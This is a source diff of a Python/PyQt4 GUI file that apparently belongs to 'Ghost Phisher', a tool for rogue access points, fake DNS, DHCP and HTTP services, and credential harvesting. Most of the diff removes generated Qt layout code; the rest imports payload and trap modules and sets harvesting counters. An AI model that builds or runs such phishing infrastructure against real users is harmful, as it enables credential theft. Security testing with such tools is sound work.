@@ -1,37 +1,51 @@
-from PyQt4 import QtCore, QtGui
-
-
-try:
-    _fromUtf8 = QtCore.QString.fromUtf8
-except AttributeError:
-    _fromUtf8 = lambda s: s
-
 import os                   # For operating system related call e.g [os.listdir()]
+import re                   # String matching
 import sys                  # For validating execution of GUI components e.g [QApplication(sys.argv)]
 import time                 # For displaying time of executed attacks
 import thread               # For running services in a sub-processed loop(threads)
 import socket               # For network based servcies e.g DNS
 import urllib2              # For getting the source code of websites that user wants to clone
 import sqlite3              # For saving fetched credentials to database
+import shutil               # For file copy operations
 import commands             # For executing shell commands and getting system output e.g DHCP3
 import subprocess           # For reading live output from terminal processes
 
+
+
+from settings import *
+from ghost_ui import *
+from core.http_core import *
+from core import variables
+from core import ghost_trap_core
+from core import metasploit_payload
+from core.update import update_class
 from tip_settings import tip_settings
 from font_settings import font_settings
-from settings import *
+
+
+from PyQt4 import QtCore, QtGui
 
 cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                          # Thats because the HTTP server changes directory after launch
 
 
+# os.environ["ghost_trap_http_server"] = "start"
+
+os.environ["ghost_trap_http_server"] = "stop"
+os.environ["ghost_fake_http_control"] = "stop"
+
+# os.environ.get("ghost_trap_http_server") == "stop"
+# os.environ.get("ghost_trap_http_server") == "start"
+
+
 #
 # Global variables
 #
-usable_interface_cards = {}                                     #Dictionary holding interface cards and addresses
+usable_interface_cards = {}                                     # Dictionary holding interface cards and addresses
 interface_card_list = []                                        # Holds interface card names
 
 # Global variables for Fake DNS
-dns_contol = 1                                                  #Used to control the DNS Service
+dns_contol = 1                                                  # Used to control the DNS Service
 dns_connections = 0                                             # Display numbers of dns connections on the tab label
 dns_ip_and_websites = {}                                        # Holds mappings of fake ip to dns
 
@@ -41,8 +55,6 @@ dhcp_server_binary = ''
 dhcp_config_file = "/tmp/ghost_dhcpd.conf"
 dhcp_pid_file = "/tmp/ghost_dhcpd.pid"
 
-# Global variables for Sniffer process
-ettercap_installation_status = ''                                 # Holds the ettercap installation status
 
 # Global variables for Fake HTTP
 http_server_port = 80                                           # Default HTTP port
@@ -51,1001 +63,13 @@ http_control = 0                                                # Used to contro
 # Global variables for Credential Harvester
 captured_credential = 0                                         # Holds the number of captured crdentials
 
-class Ui_ghost_phisher(object):
-    def setupUi(self, ghost_phisher):
-        ghost_phisher.setObjectName(_fromUtf8("ghost_phisher"))
-        ghost_phisher.resize(786, 655)
-        icon = QtGui.QIcon()
-        icon.addPixmap(QtGui.QPixmap(_fromUtf8("%s/gui/images/icon.png"%(cwd))), QtGui.QIcon.Normal, QtGui.QIcon.Off)
-        self.centralwidget = QtGui.QWidget(ghost_phisher)
-        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
-        self.verticalLayout_10 = QtGui.QVBoxLayout(self.centralwidget)
-        self.verticalLayout_10.setObjectName(_fromUtf8("verticalLayout_10"))
-        self.graphicsView = QtGui.QGraphicsView(self.centralwidget)
-        self.graphicsView.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
-        self.graphicsView.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
-        self.graphicsView.setObjectName(_fromUtf8("graphicsView"))
-        self.verticalLayout_10.addWidget(self.graphicsView)
-        self.tabWidget = QtGui.QTabWidget(self.centralwidget)
+ghost_settings = Ghost_settings()                               # Ghost settings file object
 
-        font = QtGui.QFont()
-        try:
-            font.setPointSize(int(read_last_settings('font-settings')))
-        except IndexError:
-            font.setPointSize(7)
-            create_settings('font-settings',7)
-
-        self.tabWidget.setFont(font)
-        self.tabWidget.setStatusTip(_fromUtf8(""))
-        self.tabWidget.setObjectName(_fromUtf8("tabWidget"))
-        self.tab_5 = QtGui.QWidget()
-        self.tab_5.setObjectName(_fromUtf8("tab_5"))
-        self.verticalLayout_36 = QtGui.QVBoxLayout(self.tab_5)
-        self.verticalLayout_36.setObjectName(_fromUtf8("verticalLayout_36"))
-        self.groupBox_15 = QtGui.QGroupBox(self.tab_5)
-        self.groupBox_15.setObjectName(_fromUtf8("groupBox_15"))
-        self.verticalLayout_35 = QtGui.QVBoxLayout(self.groupBox_15)
-        self.verticalLayout_35.setObjectName(_fromUtf8("verticalLayout_35"))
-        self.verticalLayout_34 = QtGui.QVBoxLayout()
-        self.verticalLayout_34.setObjectName(_fromUtf8("verticalLayout_34"))
-        self.horizontalLayout_40 = QtGui.QHBoxLayout()
-        self.horizontalLayout_40.setObjectName(_fromUtf8("horizontalLayout_40"))
-        self.access_point_label = QtGui.QLabel(self.groupBox_15)
-        self.access_point_label.setObjectName(_fromUtf8("access_point_label"))
-        self.horizontalLayout_40.addWidget(self.access_point_label)
-        self.channel_label = QtGui.QLabel(self.groupBox_15)
-        self.channel_label.setObjectName(_fromUtf8("channel_label"))
-        self.horizontalLayout_40.addWidget(self.channel_label)
-        self.ip_address_label = QtGui.QLabel(self.groupBox_15)
-        self.ip_address_label.setObjectName(_fromUtf8("ip_address_label"))
-        self.horizontalLayout_40.addWidget(self.ip_address_label)
-        self.main_mac_address_label = QtGui.QLabel(self.groupBox_15)
-        self.main_mac_address_label.setObjectName(_fromUtf8("main_mac_address_label"))
-        self.horizontalLayout_40.addWidget(self.main_mac_address_label)
-        self.verticalLayout_34.addLayout(self.horizontalLayout_40)
-        self.access_runtime = QtGui.QLabel(self.groupBox_15)
-        self.access_runtime.setObjectName(_fromUtf8("access_runtime"))
-        self.verticalLayout_34.addWidget(self.access_runtime)
-        self.verticalLayout_35.addLayout(self.verticalLayout_34)
-        self.verticalLayout_36.addWidget(self.groupBox_15)
-        self.groupBox_14 = QtGui.QGroupBox(self.tab_5)
-        self.groupBox_14.setObjectName(_fromUtf8("groupBox_14"))
-        self.verticalLayout_32 = QtGui.QVBoxLayout(self.groupBox_14)
-        self.verticalLayout_32.setObjectName(_fromUtf8("verticalLayout_32"))
-        self.horizontalLayout_42 = QtGui.QHBoxLayout()
-        self.horizontalLayout_42.setObjectName(_fromUtf8("horizontalLayout_42"))
-        spacerItem = QtGui.QSpacerItem(213, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_42.addItem(spacerItem)
-        self.horizontalLayout_41 = QtGui.QHBoxLayout()
-        self.horizontalLayout_41.setObjectName(_fromUtf8("horizontalLayout_41"))
-        self.comboBox = QtGui.QComboBox(self.groupBox_14)
-        self.comboBox.setEnabled(True)
-        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Preferred, QtGui.QSizePolicy.Preferred)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(0)
-        sizePolicy.setHeightForWidth(self.comboBox.sizePolicy().hasHeightForWidth())
-        self.comboBox.setSizePolicy(sizePolicy)
-        self.comboBox.setObjectName(_fromUtf8("comboBox"))
-        self.horizontalLayout_41.addWidget(self.comboBox)
-        spacerItem1 = QtGui.QSpacerItem(11, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_41.addItem(spacerItem1)
-        self.refresh_button = QtGui.QPushButton(self.groupBox_14)
-        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Preferred)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(0)
-        sizePolicy.setHeightForWidth(self.refresh_button.sizePolicy().hasHeightForWidth())
-        self.refresh_button.setSizePolicy(sizePolicy)
-        self.refresh_button.setObjectName(_fromUtf8("refresh_button"))
-        self.horizontalLayout_41.addWidget(self.refresh_button)
-        self.horizontalLayout_42.addLayout(self.horizontalLayout_41)
-        spacerItem2 = QtGui.QSpacerItem(183, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_42.addItem(spacerItem2)
-        self.verticalLayout_32.addLayout(self.horizontalLayout_42)
-        spacerItem3 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_32.addItem(spacerItem3)
-        self.horizontalLayout_38 = QtGui.QHBoxLayout()
-        self.horizontalLayout_38.setObjectName(_fromUtf8("horizontalLayout_38"))
-        self.acess_interface = QtGui.QLabel(self.groupBox_14)
-        self.acess_interface.setObjectName(_fromUtf8("acess_interface"))
-        self.horizontalLayout_38.addWidget(self.acess_interface)
-        self.mac_address_label = QtGui.QLabel(self.groupBox_14)
-        self.mac_address_label.setObjectName(_fromUtf8("mac_address_label"))
-        self.horizontalLayout_38.addWidget(self.mac_address_label)
-        self.driver_label = QtGui.QLabel(self.groupBox_14)
-        self.driver_label.setObjectName(_fromUtf8("driver_label"))
-        self.horizontalLayout_38.addWidget(self.driver_label)
-        self.monitor_label = QtGui.QLabel(self.groupBox_14)
-        self.monitor_label.setObjectName(_fromUtf8("monitor_label"))
-        self.horizontalLayout_38.addWidget(self.monitor_label)
-        self.verticalLayout_32.addLayout(self.horizontalLayout_38)
-        spacerItem4 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_32.addItem(spacerItem4)
-        self.horizontalLayout_39 = QtGui.QHBoxLayout()
-        self.horizontalLayout_39.setObjectName(_fromUtf8("horizontalLayout_39"))
-        self.monitor_button = QtGui.QPushButton(self.groupBox_14)
-        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Preferred)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(0)
-        sizePolicy.setHeightForWidth(self.monitor_button.sizePolicy().hasHeightForWidth())
-        self.monitor_button.setSizePolicy(sizePolicy)
-        self.monitor_button.setObjectName(_fromUtf8("monitor_button"))
-        self.horizontalLayout_39.addWidget(self.monitor_button)
-        spacerItem5 = QtGui.QSpacerItem(0, 18, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Preferred)
-        self.horizontalLayout_39.addItem(spacerItem5)
-        self.verticalLayout_32.addLayout(self.horizontalLayout_39)
-        spacerItem6 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_32.addItem(spacerItem6)
-        self.verticalLayout_36.addWidget(self.groupBox_14)
-        self.groupBox_16 = QtGui.QGroupBox(self.tab_5)
-        self.groupBox_16.setObjectName(_fromUtf8("groupBox_16"))
-        self.verticalLayout_33 = QtGui.QVBoxLayout(self.groupBox_16)
-        self.verticalLayout_33.setObjectName(_fromUtf8("verticalLayout_33"))
-        self.horizontalLayout_37 = QtGui.QHBoxLayout()
-        self.horizontalLayout_37.setObjectName(_fromUtf8("horizontalLayout_37"))
-        self.verticalLayout_31 = QtGui.QVBoxLayout()
-        self.verticalLayout_31.setObjectName(_fromUtf8("verticalLayout_31"))
-        self.horizontalLayout_35 = QtGui.QHBoxLayout()
-        self.horizontalLayout_35.setObjectName(_fromUtf8("horizontalLayout_35"))
-        self.verticalLayout_28 = QtGui.QVBoxLayout()
-        self.verticalLayout_28.setObjectName(_fromUtf8("verticalLayout_28"))
-        self.label_36 = QtGui.QLabel(self.groupBox_16)
-        self.label_36.setObjectName(_fromUtf8("label_36"))
-        self.verticalLayout_28.addWidget(self.label_36)
-        self.label_37 = QtGui.QLabel(self.groupBox_16)
-        self.label_37.setObjectName(_fromUtf8("label_37"))
-        self.verticalLayout_28.addWidget(self.label_37)
-        self.horizontalLayout_35.addLayout(self.verticalLayout_28)
-        self.verticalLayout_27 = QtGui.QVBoxLayout()
-        self.verticalLayout_27.setObjectName(_fromUtf8("verticalLayout_27"))
-        self.access_name_edit = QtGui.QLineEdit(self.groupBox_16)
-        self.access_name_edit.setObjectName(_fromUtf8("access_name_edit"))
-        self.verticalLayout_27.addWidget(self.access_name_edit)
-        self.ip_address_label_2 = QtGui.QLineEdit(self.groupBox_16)
-        self.ip_address_label_2.setObjectName(_fromUtf8("ip_address_label_2"))
-        self.verticalLayout_27.addWidget(self.ip_address_label_2)
-        self.horizontalLayout_35.addLayout(self.verticalLayout_27)
-        self.verticalLayout_31.addLayout(self.horizontalLayout_35)
-        self.horizontalLayout_36 = QtGui.QHBoxLayout()
-        self.horizontalLayout_36.setObjectName(_fromUtf8("horizontalLayout_36"))
-        self.label_38 = QtGui.QLabel(self.groupBox_16)
-        self.label_38.setObjectName(_fromUtf8("label_38"))
-        self.horizontalLayout_36.addWidget(self.label_38)
-        self.channel_combo = QtGui.QComboBox(self.groupBox_16)
-        self.channel_combo.setObjectName(_fromUtf8("channel_combo"))
-        self.horizontalLayout_36.addWidget(self.channel_combo)
-        spacerItem7 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_36.addItem(spacerItem7)
-        self.verticalLayout_31.addLayout(self.horizontalLayout_36)
-        self.horizontalLayout_37.addLayout(self.verticalLayout_31)
-        spacerItem8 = QtGui.QSpacerItem(13, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_37.addItem(spacerItem8)
-        self.groupBox_18 = QtGui.QGroupBox(self.groupBox_16)
-        self.groupBox_18.setObjectName(_fromUtf8("groupBox_18"))
-        self.horizontalLayout_32 = QtGui.QHBoxLayout(self.groupBox_18)
-        self.horizontalLayout_32.setObjectName(_fromUtf8("horizontalLayout_32"))
-        self.horizontalLayout_34 = QtGui.QHBoxLayout()
-        self.horizontalLayout_34.setObjectName(_fromUtf8("horizontalLayout_34"))
-        self.rouge_radio = QtGui.QRadioButton(self.groupBox_18)
-        self.rouge_radio.setChecked(True)
-        self.rouge_radio.setObjectName(_fromUtf8("rouge_radio"))
-        self.horizontalLayout_34.addWidget(self.rouge_radio)
-        spacerItem9 = QtGui.QSpacerItem(28, 11, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_34.addItem(spacerItem9)
-        self.wpa_radio = QtGui.QRadioButton(self.groupBox_18)
-        self.wpa_radio.setObjectName(_fromUtf8("wpa_radio"))
-        self.horizontalLayout_34.addWidget(self.wpa_radio)
-        spacerItem10 = QtGui.QSpacerItem(28, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_34.addItem(spacerItem10)
-        self.wep_radio = QtGui.QRadioButton(self.groupBox_18)
-        self.wep_radio.setObjectName(_fromUtf8("wep_radio"))
-        self.horizontalLayout_34.addWidget(self.wep_radio)
-        self.lineEdit = QtGui.QLineEdit(self.groupBox_18)
-        self.lineEdit.setObjectName(_fromUtf8("lineEdit"))
-        self.horizontalLayout_34.addWidget(self.lineEdit)
-        self.horizontalLayout_32.addLayout(self.horizontalLayout_34)
-        self.horizontalLayout_37.addWidget(self.groupBox_18)
-        self.verticalLayout_33.addLayout(self.horizontalLayout_37)
-        self.verticalLayout_36.addWidget(self.groupBox_16)
-        self.groupBox_17 = QtGui.QGroupBox(self.tab_5)
-        self.groupBox_17.setObjectName(_fromUtf8("groupBox_17"))
-        self.verticalLayout_29 = QtGui.QVBoxLayout(self.groupBox_17)
-        self.verticalLayout_29.setObjectName(_fromUtf8("verticalLayout_29"))
-        self.access_textbrowser = QtGui.QTextBrowser(self.groupBox_17)
-        self.access_textbrowser.setObjectName(_fromUtf8("access_textbrowser"))
-        self.verticalLayout_29.addWidget(self.access_textbrowser)
-        self.verticalLayout_36.addWidget(self.groupBox_17)
-        self.verticalLayout_30 = QtGui.QVBoxLayout()
-        self.verticalLayout_30.setObjectName(_fromUtf8("verticalLayout_30"))
-        self.access_connection_label = QtGui.QLabel(self.tab_5)
-        self.access_connection_label.setObjectName(_fromUtf8("access_connection_label"))
-        self.verticalLayout_30.addWidget(self.access_connection_label)
-        self.horizontalLayout_33 = QtGui.QHBoxLayout()
-        self.horizontalLayout_33.setObjectName(_fromUtf8("horizontalLayout_33"))
-        spacerItem11 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_33.addItem(spacerItem11)
-        self.access_start = QtGui.QPushButton(self.tab_5)
-        self.access_start.setObjectName(_fromUtf8("access_start"))
-        self.horizontalLayout_33.addWidget(self.access_start)
-        spacerItem12 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_33.addItem(spacerItem12)
-        self.access_stop = QtGui.QPushButton(self.tab_5)
-        self.access_stop.setObjectName(_fromUtf8("access_stop"))
-        self.horizontalLayout_33.addWidget(self.access_stop)
-        spacerItem13 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_33.addItem(spacerItem13)
-        self.verticalLayout_30.addLayout(self.horizontalLayout_33)
-        self.verticalLayout_36.addLayout(self.verticalLayout_30)
-        self.tabWidget.addTab(self.tab_5, _fromUtf8(""))
-        self.dns_tab = QtGui.QWidget()
-        self.dns_tab.setObjectName(_fromUtf8("dns_tab"))
-        self.verticalLayout_25 = QtGui.QVBoxLayout(self.dns_tab)
-        self.verticalLayout_25.setObjectName(_fromUtf8("verticalLayout_25"))
-        self.verticalLayout_5 = QtGui.QVBoxLayout()
-        self.verticalLayout_5.setObjectName(_fromUtf8("verticalLayout_5"))
-        self.groupBox = QtGui.QGroupBox(self.dns_tab)
-        self.groupBox.setObjectName(_fromUtf8("groupBox"))
-        self.verticalLayout_2 = QtGui.QVBoxLayout(self.groupBox)
-        self.verticalLayout_2.setObjectName(_fromUtf8("verticalLayout_2"))
-        self.horizontalLayout_4 = QtGui.QHBoxLayout()
-        self.horizontalLayout_4.setObjectName(_fromUtf8("horizontalLayout_4"))
-        self.card_interface_combo = QtGui.QComboBox(self.groupBox)
-        self.card_interface_combo.setObjectName(_fromUtf8("card_interface_combo"))
-        self.horizontalLayout_4.addWidget(self.card_interface_combo)
-        spacerItem14 = QtGui.QSpacerItem(102, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_4.addItem(spacerItem14)
-        self.ip_address_combo = QtGui.QComboBox(self.groupBox)
-        self.ip_address_combo.setObjectName(_fromUtf8("ip_address_combo"))
-        self.horizontalLayout_4.addWidget(self.ip_address_combo)
-        self.verticalLayout_2.addLayout(self.horizontalLayout_4)
-        self.horizontalLayout_5 = QtGui.QHBoxLayout()
-        self.horizontalLayout_5.setObjectName(_fromUtf8("horizontalLayout_5"))
-        self.current_card_label = QtGui.QLabel(self.groupBox)
-        self.current_card_label.setObjectName(_fromUtf8("current_card_label"))
-        self.horizontalLayout_5.addWidget(self.current_card_label)
-        spacerItem15 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_5.addItem(spacerItem15)
-        self.service_dns_run_label = QtGui.QLabel(self.groupBox)
-        self.service_dns_run_label.setObjectName(_fromUtf8("service_dns_run_label"))
-        self.horizontalLayout_5.addWidget(self.service_dns_run_label)
-        self.verticalLayout_2.addLayout(self.horizontalLayout_5)
-        self.horizontalLayout_6 = QtGui.QHBoxLayout()
-        self.horizontalLayout_6.setObjectName(_fromUtf8("horizontalLayout_6"))
-        self.dns_port = QtGui.QLabel(self.groupBox)
-        self.dns_port.setObjectName(_fromUtf8("dns_port"))
-        self.horizontalLayout_6.addWidget(self.dns_port)
-        spacerItem16 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_6.addItem(spacerItem16)
-        self.label_5 = QtGui.QLabel(self.groupBox)
-        self.label_5.setObjectName(_fromUtf8("label_5"))
-        self.horizontalLayout_6.addWidget(self.label_5)
-        self.verticalLayout_2.addLayout(self.horizontalLayout_6)
-        self.verticalLayout_5.addWidget(self.groupBox)
-        self.groupBox_2 = QtGui.QGroupBox(self.dns_tab)
-        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
-        self.verticalLayout_4 = QtGui.QVBoxLayout(self.groupBox_2)
-        self.verticalLayout_4.setObjectName(_fromUtf8("verticalLayout_4"))
-        self.resolveall_radio = QtGui.QRadioButton(self.groupBox_2)
-        self.resolveall_radio.setChecked(True)
-        self.resolveall_radio.setObjectName(_fromUtf8("resolveall_radio"))
-        self.verticalLayout_4.addWidget(self.resolveall_radio)
-        self.dns_ip_address = QtGui.QLineEdit(self.groupBox_2)
-        self.dns_ip_address.setText(_fromUtf8(""))
-        self.dns_ip_address.setObjectName(_fromUtf8("dns_ip_address"))
-        self.verticalLayout_4.addWidget(self.dns_ip_address)
-        self.respond_domain_radio = QtGui.QRadioButton(self.groupBox_2)
-        self.respond_domain_radio.setEnabled(True)
-        self.respond_domain_radio.setObjectName(_fromUtf8("respond_domain_radio"))
-        self.verticalLayout_4.addWidget(self.respond_domain_radio)
-        self.horizontalLayout_3 = QtGui.QHBoxLayout()
-        self.horizontalLayout_3.setObjectName(_fromUtf8("horizontalLayout_3"))
-        self.label_6 = QtGui.QLabel(self.groupBox_2)
-        self.label_6.setObjectName(_fromUtf8("label_6"))
-        self.horizontalLayout_3.addWidget(self.label_6)
-        self.domain_ip = QtGui.QLineEdit(self.groupBox_2)
-        self.domain_ip.setObjectName(_fromUtf8("domain_ip"))
-        self.horizontalLayout_3.addWidget(self.domain_ip)
-        spacerItem17 = QtGui.QSpacerItem(12, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_3.addItem(spacerItem17)
-        self.label_7 = QtGui.QLabel(self.groupBox_2)
-        self.label_7.setObjectName(_fromUtf8("label_7"))
-        self.horizontalLayout_3.addWidget(self.label_7)
-        self.domain_label = QtGui.QLineEdit(self.groupBox_2)
-        self.domain_label.setObjectName(_fromUtf8("domain_label"))
-        self.horizontalLayout_3.addWidget(self.domain_label)
-        self.verticalLayout_4.addLayout(self.horizontalLayout_3)
-        self.domain_add_button = QtGui.QPushButton(self.groupBox_2)
-        self.domain_add_button.setObjectName(_fromUtf8("domain_add_button"))
-        self.verticalLayout_4.addWidget(self.domain_add_button)
-        self.verticalLayout_5.addWidget(self.groupBox_2)
-        self.groupBox_3 = QtGui.QGroupBox(self.dns_tab)
-        self.groupBox_3.setObjectName(_fromUtf8("groupBox_3"))
-        self.verticalLayout_24 = QtGui.QVBoxLayout(self.groupBox_3)
-        self.verticalLayout_24.setObjectName(_fromUtf8("verticalLayout_24"))
-        self.dns_textbrowser = QtGui.QTextBrowser(self.groupBox_3)
-        self.dns_textbrowser.setObjectName(_fromUtf8("dns_textbrowser"))
-        self.verticalLayout_24.addWidget(self.dns_textbrowser)
-        self.verticalLayout_5.addWidget(self.groupBox_3)
-        self.verticalLayout = QtGui.QVBoxLayout()
-        self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
-        self.dns_connection_label = QtGui.QLabel(self.dns_tab)
-        self.dns_connection_label.setObjectName(_fromUtf8("dns_connection_label"))
-        self.verticalLayout.addWidget(self.dns_connection_label)
-        self.horizontalLayout = QtGui.QHBoxLayout()
-        self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
-        spacerItem18 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout.addItem(spacerItem18)
-        self.dns_start = QtGui.QPushButton(self.dns_tab)
-        self.dns_start.setObjectName(_fromUtf8("dns_start"))
-        self.horizontalLayout.addWidget(self.dns_start)
-        spacerItem19 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout.addItem(spacerItem19)
-        self.dns_stop = QtGui.QPushButton(self.dns_tab)
-        self.dns_stop.setObjectName(_fromUtf8("dns_stop"))
-        self.horizontalLayout.addWidget(self.dns_stop)
-        spacerItem20 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout.addItem(spacerItem20)
-        self.verticalLayout.addLayout(self.horizontalLayout)
-        self.verticalLayout_5.addLayout(self.verticalLayout)
-        self.verticalLayout_25.addLayout(self.verticalLayout_5)
-        self.tabWidget.addTab(self.dns_tab, _fromUtf8(""))
-        self.tab_2 = QtGui.QWidget()
-        self.tab_2.setObjectName(_fromUtf8("tab_2"))
-        self.verticalLayout_26 = QtGui.QVBoxLayout(self.tab_2)
-        self.verticalLayout_26.setObjectName(_fromUtf8("verticalLayout_26"))
-        self.verticalLayout_7 = QtGui.QVBoxLayout()
-        self.verticalLayout_7.setObjectName(_fromUtf8("verticalLayout_7"))
-        self.groupBox_4 = QtGui.QGroupBox(self.tab_2)
-        self.groupBox_4.setObjectName(_fromUtf8("groupBox_4"))
-        self.horizontalLayout_9 = QtGui.QHBoxLayout(self.groupBox_4)
-        self.horizontalLayout_9.setObjectName(_fromUtf8("horizontalLayout_9"))
-        self.verticalLayout_6 = QtGui.QVBoxLayout()
-        self.verticalLayout_6.setObjectName(_fromUtf8("verticalLayout_6"))
-        self.label = QtGui.QLabel(self.groupBox_4)
-        self.label.setObjectName(_fromUtf8("label"))
-        self.verticalLayout_6.addWidget(self.label)
-        self.label_2 = QtGui.QLabel(self.groupBox_4)
-        self.label_2.setObjectName(_fromUtf8("label_2"))
-        self.verticalLayout_6.addWidget(self.label_2)
-        self.label_3 = QtGui.QLabel(self.groupBox_4)
-        self.label_3.setObjectName(_fromUtf8("label_3"))
-        self.verticalLayout_6.addWidget(self.label_3)
-        self.horizontalLayout_9.addLayout(self.verticalLayout_6)
-        self.verticalLayout_7.addWidget(self.groupBox_4)
-        self.groupBox_5 = QtGui.QGroupBox(self.tab_2)
-        self.groupBox_5.setObjectName(_fromUtf8("groupBox_5"))
-        self.verticalLayout_9 = QtGui.QVBoxLayout(self.groupBox_5)
-        self.verticalLayout_9.setObjectName(_fromUtf8("verticalLayout_9"))
-        self.horizontalLayout_31 = QtGui.QHBoxLayout()
-        self.horizontalLayout_31.setObjectName(_fromUtf8("horizontalLayout_31"))
-        self.verticalLayout_3 = QtGui.QVBoxLayout()
-        self.verticalLayout_3.setObjectName(_fromUtf8("verticalLayout_3"))
-        self.horizontalLayout_29 = QtGui.QHBoxLayout()
-        self.horizontalLayout_29.setObjectName(_fromUtf8("horizontalLayout_29"))
-        self.label_4 = QtGui.QLabel(self.groupBox_5)
-        self.label_4.setObjectName(_fromUtf8("label_4"))
-        self.horizontalLayout_29.addWidget(self.label_4)
-        self.start_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.start_ip.setObjectName(_fromUtf8("start_ip"))
-        self.horizontalLayout_29.addWidget(self.start_ip)
-        self.verticalLayout_3.addLayout(self.horizontalLayout_29)
-        self.horizontalLayout_14 = QtGui.QHBoxLayout()
-        self.horizontalLayout_14.setObjectName(_fromUtf8("horizontalLayout_14"))
-        self.label_9 = QtGui.QLabel(self.groupBox_5)
-        self.label_9.setObjectName(_fromUtf8("label_9"))
-        self.horizontalLayout_14.addWidget(self.label_9)
-        self.subnet_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.subnet_ip.setObjectName(_fromUtf8("subnet_ip"))
-        self.horizontalLayout_14.addWidget(self.subnet_ip)
-        self.verticalLayout_3.addLayout(self.horizontalLayout_14)
-        self.horizontalLayout_12 = QtGui.QHBoxLayout()
-        self.horizontalLayout_12.setObjectName(_fromUtf8("horizontalLayout_12"))
-        self.label_10 = QtGui.QLabel(self.groupBox_5)
-        self.label_10.setObjectName(_fromUtf8("label_10"))
-        self.horizontalLayout_12.addWidget(self.label_10)
-        self.fakedns_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.fakedns_ip.setObjectName(_fromUtf8("fakedns_ip"))
-        self.horizontalLayout_12.addWidget(self.fakedns_ip)
-        self.verticalLayout_3.addLayout(self.horizontalLayout_12)
-        self.horizontalLayout_31.addLayout(self.verticalLayout_3)
-        self.horizontalLayout_30 = QtGui.QHBoxLayout()
-        self.horizontalLayout_30.setObjectName(_fromUtf8("horizontalLayout_30"))
-        spacerItem21 = QtGui.QSpacerItem(0, 78, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_30.addItem(spacerItem21)
-        self.verticalLayout_8 = QtGui.QVBoxLayout()
-        self.verticalLayout_8.setObjectName(_fromUtf8("verticalLayout_8"))
-        self.horizontalLayout_10 = QtGui.QHBoxLayout()
-        self.horizontalLayout_10.setObjectName(_fromUtf8("horizontalLayout_10"))
-        self.label_8 = QtGui.QLabel(self.groupBox_5)
-        self.label_8.setObjectName(_fromUtf8("label_8"))
-        self.horizontalLayout_10.addWidget(self.label_8)
-        self.stop_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.stop_ip.setObjectName(_fromUtf8("stop_ip"))
-        self.horizontalLayout_10.addWidget(self.stop_ip)
-        self.verticalLayout_8.addLayout(self.horizontalLayout_10)
-        self.horizontalLayout_8 = QtGui.QHBoxLayout()
-        self.horizontalLayout_8.setObjectName(_fromUtf8("horizontalLayout_8"))
-        self.label_12 = QtGui.QLabel(self.groupBox_5)
-        self.label_12.setObjectName(_fromUtf8("label_12"))
-        self.horizontalLayout_8.addWidget(self.label_12)
-        self.gateway_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.gateway_ip.setObjectName(_fromUtf8("gateway_ip"))
-        self.horizontalLayout_8.addWidget(self.gateway_ip)
-        self.verticalLayout_8.addLayout(self.horizontalLayout_8)
-        self.horizontalLayout_2 = QtGui.QHBoxLayout()
-        self.horizontalLayout_2.setObjectName(_fromUtf8("horizontalLayout_2"))
-        self.label_11 = QtGui.QLabel(self.groupBox_5)
